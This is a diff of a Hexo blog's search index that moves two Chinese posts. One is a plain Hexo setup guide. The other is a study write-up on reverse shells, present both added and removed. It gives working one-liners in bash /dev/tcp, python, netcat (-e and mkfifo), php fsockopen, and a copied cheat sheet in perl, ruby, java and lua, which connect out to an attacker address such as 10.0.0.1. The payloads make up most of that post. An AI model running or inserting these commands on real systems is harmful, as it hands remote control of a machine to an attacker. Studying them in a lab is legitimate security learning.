@@ -526,6 +526,66 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo初使用</title>
+    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<blockquote>
+<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
+</blockquote>
+<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
+<li>Node.js</li>
+<li>git</li>
+<li>hexo</li>
+<li>GitHub账号</li>
+</ul>
+<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
+<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
+<p>配置全局变量,并生成密钥</p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
+<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
+<blockquote>
+<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
+</blockquote>
+<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
+<li>npm install hexo-deployer-git –save</li>
+</ul>
+<blockquote>
+<p>要在博客目录下右键git bash运行</p>
+</blockquote>
+<ul>
+<li>hexo clean （清除缓存和静态文件）</li>
+<li>hexo g （生成静态文件）</li>
+<li>hexo d （部署）</li>
+</ul>
+<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
+<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
+<blockquote>
+<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
+</blockquote>
+<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
+<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
+<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
+<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
+<ul>
+<li>安装插件</li>
+<li>_config.yml选项设置</li>
+<li>使用相对路径</li>
+</ul>
+<blockquote>
+<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
+</blockquote>
+<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
+<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>redis 4-unacc</title>
     <url>/2021/06/28/redis-4-unacc/</url>
     <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
@@ -585,66 +645,6 @@
       </categories>
       <tags>
         <tag>redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo初使用</title>
-    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<blockquote>
-<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
-</blockquote>
-<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
-<li>Node.js</li>
-<li>git</li>
-<li>hexo</li>
-<li>GitHub账号</li>
-</ul>
-<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
-<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
-<p>配置全局变量,并生成密钥</p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
-<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
-<blockquote>
-<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
-</blockquote>
-<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
-<li>npm install hexo-deployer-git –save</li>
-</ul>
-<blockquote>
-<p>要在博客目录下右键git bash运行</p>
-</blockquote>
-<ul>
-<li>hexo clean （清除缓存和静态文件）</li>
-<li>hexo g （生成静态文件）</li>
-<li>hexo d （部署）</li>
-</ul>
-<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
-<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
-<blockquote>
-<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
-</blockquote>
-<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
-<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
-<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
-<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
-<ul>
-<li>安装插件</li>
-<li>_config.yml选项设置</li>
-<li>使用相对路径</li>
-</ul>
-<blockquote>
-<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
-</blockquote>
-<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
-<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1112,6 +1112,60 @@
       </tags>
   </entry>
   <entry>
+    <title>反弹shell学习</title>
+    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：kali2018 192.168.229.130</p>
+<p><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
+<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>开启监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
+<p>受害机上使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
+<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
+<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
+<p>尝试两种方法后都莫有成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
+<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
+<p>默认的php.ini文件中没有打开安全模式</p>
+<p>使用php的exec函数执行反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p>但是没有成功</p>
+<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
+<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：win7 x64 192.168.229.134</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
+<p>emmm暂时先鸽了</p>
+<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
+<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>常见web漏洞学习之xss学习</title>
     <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
@@ -1182,60 +1236,6 @@
       <tags>
         <tag>xss</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>反弹shell学习</title>
-    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：kali2018 192.168.229.130</p>
-<p><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
-<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>开启监听端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
-<p>受害机上使用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
-<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
-<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
-<p>尝试两种方法后都莫有成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
-<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
-<p>默认的php.ini文件中没有打开安全模式</p>
-<p>使用php的exec函数执行反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p>但是没有成功</p>
-<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
-<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
-
-
